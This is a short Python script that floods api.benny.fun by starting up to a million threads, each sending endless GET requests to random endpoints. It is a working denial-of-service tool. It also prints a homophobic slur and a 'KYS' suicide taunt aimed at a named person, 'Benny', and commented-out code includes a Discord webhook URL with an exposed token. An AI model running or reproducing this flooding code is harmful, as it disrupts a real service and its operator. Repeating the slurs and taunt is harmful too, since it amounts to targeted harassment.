import requests
import json
import random
import time
import threading
from colorama import init, Fore
print("KYS BENNY YOU GAY FAGGOT <3")
time.sleep(5)
api = ["cat", "dog", "meme", "minion", "dadjoke", "roast", "fml"]
def yesminion():
    while True:
        ra = random.randint(1, 10000)
        url = f"https://api.benny.fun/v1/{random.choice(api)}"
        try:
            response = requests.get(url)
            print("FAG " + str(response.status_code))
        except:
            pass
        #file = open(f"image{ra}.png", "wb")
        #file.write(img.content)
        #file.close()
        #print(response1)
        #webhookdata = {
        #    "content" : response1,
        #    "username" : "KYS benny <3"
        #}
        #requests.post("https://discord.com/api/webhooks/954484431106752624/mNXSYIoEBD5MZAd5lAP6xw3r3Cp2e8ntEwQHqDHyntHZoz7T33I8BdP17pToo7v64_dB", json = webhookdata)
for i in range(1000000): 
    threading.Thread(target=yesminion).start()
